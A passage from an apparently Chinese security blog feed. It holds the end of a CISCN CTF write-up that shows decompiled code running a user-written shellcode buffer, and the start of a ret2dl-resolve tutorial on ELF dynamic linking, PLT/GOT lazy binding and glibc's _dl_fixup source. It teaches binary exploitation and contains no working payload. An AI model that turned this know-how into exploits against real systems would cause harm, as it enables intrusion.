class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">this[<span class="hljs-number">5</span>] = this[<span class="hljs-number">4</span>];<br>mprotect(this[<span class="hljs-number">4</span>], <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>);<br>`anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);<br>mprotect(this[<span class="hljs-number">4</span>], <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">5</span>);<br>v27 = `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);<br>      <br><span class="hljs-comment">// handle函数主要漏洞：</span><br>v32 = this;<br>v31 = a2;<br>v30 = *((_QWORD *)this + <span class="hljs-number">4</span>) + <span class="hljs-number">0xFF0</span>LL;<br>v29 = (llvm::BasicBlock *)llvm::Function::front(a2);<br>Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);<br>Operand = llvm::User::getOperand(Terminator, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>&#123;<br>    *((_DWORD *)this + <span class="hljs-number">12</span>) = <span class="hljs-number">0</span>;<br>    v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);<br>    SExtValue = llvm::ConstantInt::getSExtValue(v2);<br>    `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="hljs-number">0</span>, SExtValue);<br>    <span class="hljs-keyword">return</span> `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::writeRet(this);<br>&#125;    <br>    <br><span class="hljs-comment">// callCode函数：</span><br>__int64 __fastcall `anonymous namespace<span class="hljs-number">&#x27;</span>::MBAPass::callCode(<br>        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),<br>        __int64 a2)<br>&#123;<br>  <span class="hljs-keyword">return</span> this[<span class="hljs-number">4</span>]((_anonymous_namespace_::MBAPass *)this, a2);<span class="hljs-comment">//填入我们的shellcode</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先开辟一块0x1000的可读可写区域；再通过handle函数对IR代码进行优化；接着将开辟的0x1000的区域提高权限为可读可执行；最后调用callCode函数。很明显，这就是需要我们写入shellcode然后利用callCode函数进行执行。</p>]]></content>
    
    
    <categories>
      
      <category>CTF_competition：大哥别卷我</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dl-resolve</title>
    <link href="/2022/04/17/Pwn/ret2dlresolve/"/>
    <url>/2022/04/17/Pwn/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在学习ret2dl-resolve的攻击方法之前，先补充一点关于ELF文件动态链接和重定位的知识。</p><h3 id="几个重要的section"><a href="#几个重要的section" class="headerlink" title="几个重要的section"></a>几个重要的section</h3><ol><li><p><code>.dynamic</code>：ld.so使用的动态链接信息，在IDA里面如下所示：</p><p><img src="/ret2dlresolve/dynamic.png" alt=".dynamic"></p><p>这里面有很多信息，<strong>但我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</strong></p><p>这里给出32位和64位的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Dynamic section entry.  */</span><br><br> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"> &#123;</span><br>   Elf32_Swordd_tag;<span class="hljs-comment">/* Dynamic entry type */</span><br>   <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">     &#123;</span><br>       Elf32_Word d_val;<span class="hljs-comment">/* Integer value */</span><br>       Elf32_Addr d_ptr;<span class="hljs-comment">/* Address value */</span><br>     &#125; d_un;<br> &#125; Elf32_Dyn;<br><br> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"> &#123;</span><br>   Elf64_Sxwordd_tag;<span class="hljs-comment">/* Dynamic entry type */</span><br>   <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">     &#123;</span><br>       Elf64_Xword d_val;<span class="hljs-comment">/* Integer value */</span><br>       Elf64_Addr d_ptr;<span class="hljs-comment">/* Address value */</span><br>     &#125; d_un;<br> &#125; Elf64_Dyn;<br></code></pre></td></tr></table></figure></li><li><p><code>.dynstr</code>：一个字符串表，保存了动态链接所需的字符串，index[0]的地方值始终为零，在后续我们需要用这些字符串的时候，<strong>取的都是这些字符串相对于节表头的偏移</strong>，在IDA里面如下图所示：</p><p><img src="/ret2dlresolve/dynstr.png" alt=".dynstr"></p></li><li><p><code>.dynsym</code>：是一个符号表（结构体数组），该节保存了引用外部文件的符号，每一个结构体都对应一个符号，只能在运行时被解析，索引值从0开始计数，值为0的表项不具有实际的意义，表示未定义的符号，在IDA里面如下图所示：</p><p><img src="/ret2dlresolve/dynsym.png" alt=".dynsym"></p><p>这里给出32位和64位的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Wordst_name;<span class="hljs-comment">/* Symbol name (string tbl index) 相对于.dynasr的偏移*/</span><br>  Elf32_Addrst_value;<span class="hljs-comment">/* Symbol value 当符号被导出时用于存放虚拟地址*/</span><br>  Elf32_Wordst_size;<span class="hljs-comment">/* Symbol size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf32_Sectionst_shndx;<span class="hljs-comment">/* Section index */</span><br>&#125; Elf32_Sym;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Wordst_name;<span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf64_Sectionst_shndx;<span class="hljs-comment">/* Section index */</span><br>  Elf64_Addrst_value;<span class="hljs-comment">/* Symbol value */</span><br>  Elf64_Xwordst_size;<span class="hljs-comment">/* Symbol size */</span><br>&#125; Elf64_Sym;<br><br><span class="hljs-comment">/* How to extract and insert information held in the st_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_BIND(val)(((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_TYPE(val)((val) &amp; 0xf)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_INFO(bind, type)(((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br><br><span class="hljs-comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_BIND(val)ELF32_ST_BIND (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_TYPE(val)ELF32_ST_TYPE (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_INFO(bind, type)ELF32_ST_INFO ((bind), (type))</span><br><br><span class="hljs-comment">/* Legal values for ST_BIND subfield of st_info (symbol binding).  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_LOCAL0<span class="hljs-comment">/* Local symbol */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_GLOBAL1<span class="hljs-comment">/* Global symbol */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_WEAK2<span class="hljs-comment">/* Weak symbol */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>STB_NUM3<span class="hljs-comment">/* Number of defined types.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_LOOS10<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_GNU_UNIQUE10<span class="hljs-comment">/* Unique symbol.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_HIOS12<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_LOPROC13<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_HIPROC15<span class="hljs-comment">/* End of processor-specific */</span></span><br><br><span class="hljs-comment">/* Legal values for ST_TYPE subfield of st_info (symbol type).  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_NOTYPE0<span class="hljs-comment">/* Symbol type is unspecified */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_OBJECT1<span class="hljs-comment">/* Symbol is a data object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_FUNC2<span class="hljs-comment">/* Symbol is a code object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_SECTION3<span class="hljs-comment">/* Symbol associated with a section */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_FILE4<span class="hljs-comment">/* Symbol&#x27;s name is file name */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_COMMON5<span class="hljs-comment">/* Symbol is a common data object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_TLS6<span class="hljs-comment">/* Symbol is thread-local data object*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>STT_NUM7<span class="hljs-comment">/* Number of defined types.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_LOOS10<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_GNU_IFUNC10<span class="hljs-comment">/* Symbol is indirect code object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_HIOS12<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_LOPROC13<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_HIPROC15<span class="hljs-comment">/* End of processor-specific */</span></span><br></code></pre></td></tr></table></figure><p><img src="/ret2dlresolve/st_info.png" alt="st_info"></p></li><li><p><code>.rel.plt</code>：一个重定位表（其中<code>.rela.plt</code>是函数的重定位表），重定位是连接符号定义与符号引用的过程，简单来说，重定位需要把节中的符号引用转换成这些符号在进程空间的虚拟地址，在IDA如下图所示：</p><p><img src="/ret2dlresolve/rel.plt.png" alt=".rel.plt"></p><p>给出32位和64位结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addrr_offset;<span class="hljs-comment">/* Address 保存解析后的符号地址写入内存的位置（绝对地址）*/</span><br>  Elf32_Wordr_info;<span class="hljs-comment">/* Relocation type and symbol index 高3位用于标识该符号在.dynsym段中的位置*/</span><br>&#125; Elf32_Rel;<br><br><span class="hljs-comment">/* I have seen two different definitions of the Elf64_Rel and</span><br><span class="hljs-comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span><br><span class="hljs-comment">   whoever) gets their act together.  */</span><br><span class="hljs-comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addrr_offset;<span class="hljs-comment">/* Address */</span><br>  Elf64_Xwordr_info;<span class="hljs-comment">/* Relocation type and symbol index */</span><br>&#125; Elf64_Rel;<br><br><span class="hljs-comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addrr_offset;<span class="hljs-comment">/* Address */</span><br>  Elf32_Wordr_info;<span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf32_Swordr_addend;<span class="hljs-comment">/* Addend */</span><br>&#125; Elf32_Rela;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addrr_offset;<span class="hljs-comment">/* Address */</span><br>  Elf64_Xwordr_info;<span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf64_Sxwordr_addend;<span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<br><br><span class="hljs-comment">/* How to extract and insert information held in the r_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)((val) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)((val) &amp; 0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_INFO(sym, type)(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_SYM(i)((i) &gt;&gt; 32)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_TYPE(i)((i) &amp; 0xffffffff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_INFO(sym,type)((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><br></code></pre></td></tr></table></figure><ul><li><code>r_offset</code>是在重定位时需要被修改的符号的偏移，指向got表中的对应函数</li><li><code>r_info</code>分为两部分：<code>type</code>指示如何修改引用，<code>symbol</code>指示应该修改引用为哪个符号</li></ul></li></ol><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><h4 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h4><p>延迟绑定的基本思想就是当函数第一次被调用时，动态链接器才进行符号查找、重定位等操作。如果未被调用则不进行绑定。ELF文件通过PLT和GOT的配合来实现延迟绑定，每个被调用的函数都有一组对应的PLT和GOT。</p><p>PLT是位于代码段.plt节的一个数组，每个条目占8个字节，如下所示：</p><ul><li>PLT[0]：用于跳转到动态连接器</li><li>PLT[1]：用于调用系统启动函数__libc_start_main()，main函数就是在这里被调用</li><li><strong>PLT[2]：从这里开始就是被调用函数的条目</strong></li></ul><p>GOT是位于数据段.got.plt节的一个数组，每个条目占8个字节，如下所示：</p><ul><li>GOT[0]：动态链接器在解析函数地址时需要的地址<code>.dynamic</code>条目</li><li>GOT[1]：动态链接器在解析函数地址时需要的地址<code>relor</code>条目(<code>reloc entries</code>)</li><li>GOT[2]：动态链接器ld-linux.so的入口点，即<code>_dl_runtime_resolve</code>函数</li><li><strong>GOT[3]：从这里开始就是被调用函数的条目</strong></li></ul><blockquote><p>在这里说明以下，为了引入RELRO保护机制，GOT被拆分为<code>.got</code>节和<code>.got.plt</code>节两个部分，不用于延迟绑定的前者用于保存全局变量（只读），用于延迟绑定的后者则用于保存函数引用（读写）。</p></blockquote><h4 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h4><p>以调用func函数为例：</p><ol><li><p>首先会进入func@plt，第一条指令jmp跳转到指定的GOT条目，该位置保存的是func@plt的第二条指令</p></li><li><p>执行push指令，将对应的func在<code>.rel.plt</code>中的下标压栈（<strong>这里就是之后的reloc_index</strong>），然后进入PLT[0]</p></li><li><p>PLT[0]先将GOT[1]（一个<strong>link_map对象</strong>的地址）压栈，然后调用GOT[2]，即调用了<code>_dl_runtime_resolve()</code>函数，完成符号解析和重定位工作</p><blockquote><p>这里的link_map是用于获取解析导入函数所需要的信息，它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section。</p></blockquote></li></ol><h2 id="dl-runtime-resolve-函数"><a href="#dl-runtime-resolve-函数" class="headerlink" title="_dl_runtime_resolve()函数"></a>_dl_runtime_resolve()函数</h2><p>首先我们要了解：</p><ul><li><strong>每一个符号都是一个<code>Elf_Sym</code>结构体的实例，这些符号又共同组成了<code>.dynsym</code>段</strong></li><li><strong>导入符号的解析需要进行重定位，每个重定位项都是一个<code>Elf_Rel</code>结构体的实例，这些项又共同组成了<code>.rel.plt</code>段（用于导入函数）和<code>.rel.dyn</code>段（用于导入全局变量）</strong></li></ul><p><img src="/ret2dlresolve/ret2dl.2.png" alt="符号解析"></p><p>当程序导入一个函数，动态链接器会同时在<code>.dynstr</code>段中添加一个函数名字符串，在<code>.dynsym</code>段中添加一个指向函数名字符串的<code>Elf_Sym</code>，在<code>.rel.plt</code>段中添加一个指向<code>Elf_Sym</code>的<code>Elf_Rel</code>，最后这些<code>Elf_Rel</code>的<code>r_offset</code>域又构成了GOT表，保存在<code>.got.plt</code>段中。</p><p>我们具体来看一下<code>_dl_runtime_resolve(link_map, reloc_arg)</code>到底干了什么</p><p>这里附上E4L4师傅的流程图：</p><p><img src="/ret2dlresolve/ret2dl.1.png" alt="流程图"></p><ol><li><strong>通过<code>link_map</code>访问<code>.dynamic</code>，并取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</strong></li><li><strong><code>.rel.plt</code>的地址与传入的<code>reloc_arg</code>参数（即我们想要函数的<code>Elf_Rel</code>在<code>.rel.plt</code>中的偏移）相加得到该函数的重定位表<code>Elf_Rel</code></strong></li><li><strong>通过<code>Elf_Rel</code>这个结构体的成员<code>r_info</code>的高3位（<code>rel-&gt;r_info &gt;&gt; 8</code>）得到该函数在<code>.dynsym</code>的索引，由此得到该函数的<code>Elf_Sym</code></strong></li><li><strong>通过<code>Elf_Sym</code>这个结构体的成员<code>st_name</code>（<code>sym-&gt;st_name</code>)与<code>.dynstr</code>相加得到符号字符串的指针</strong></li><li><strong>第一个<code>link_map</code>结构体成员的<code>l-&gt;l_addr</code>始终为0，与<code>Elf32_Rel</code>结构体的<code>rel-&gt;r_offset</code>成员相加就是该符号的<code>.got.plt</code>地址，只需要将得到的真实地址给<code>*rel-&gt;r_offset</code>即可</strong></li></ol><p><strong>注意：这里会检查<code>rel-&gt;r_info</code>的<code>type</code>，即其最低为是否是7，否则会发生警告。</strong></p><p><code>_dl_runtime_resolve(link_map, reloc_arg)</code>实际调用的是<code>_dl_fixup(link_map, reloc_arg)</code>，这里贴出其源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<span class="hljs-comment">//取出.dynsym</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<span class="hljs-comment">//取出.dynstr</span><br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<span class="hljs-comment">//取出Elf_Rel</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<span class="hljs-comment">//取出Elf_Sym</span><br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<span class="hljs-comment">//对应的GOT地址</span><br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<span class="hljs-comment">//检查是否为7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum =<br>    (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>  version = &amp;l-&gt;l_versions[ndx];<br>  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>    version = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment"> not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment"> we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>&#123;<br>  THREAD_GSCOPE_SET_FLAG ();<br>  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>      RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//找到包含对应符号的对象文件(libc)，返回一个指向其基地址的指针</span><br>      <br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment"> of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment"> offset.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>   sym ? (LOOKUP_VALUE_ADDRESS (result)<br>  + sym-&gt;st_value) : <span class="hljs-number">0</span>);<span class="hljs-comment">//获得函数的真实内存地址</span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment"> address) is also known.  */</span><br>      value = 